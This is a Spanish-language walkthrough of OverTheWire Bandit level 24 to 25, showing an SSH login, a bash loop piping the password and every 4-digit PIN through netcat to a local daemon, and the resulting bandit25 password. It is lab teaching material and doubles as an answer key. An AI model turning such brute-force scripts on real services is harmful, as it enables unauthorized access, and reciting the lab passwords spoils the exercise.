# Level 24 -> level 25

## Objetivo

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Datos de acceso

Host: **bandit.labs.overthewire.org** on port 2220

Username: **bandit24**

Password: **VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar**

## Solución

```bash
hone@Unidad03:~$ ssh bandit24@bandit.labs.overthewire.org -p 2220
```

```bash
bandit22@bandit.labs.overthewire.org's password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

```bash
nano bruto.sh
```

En el editor se crea el siguiente programa:

```bash
#!/bin/bash

for i in {0000..9999}; 
    do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong!
```

```bash
bandit24@bandit:/tmp$ bash bruto.sh
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

## Notas adicionales

## Referencias
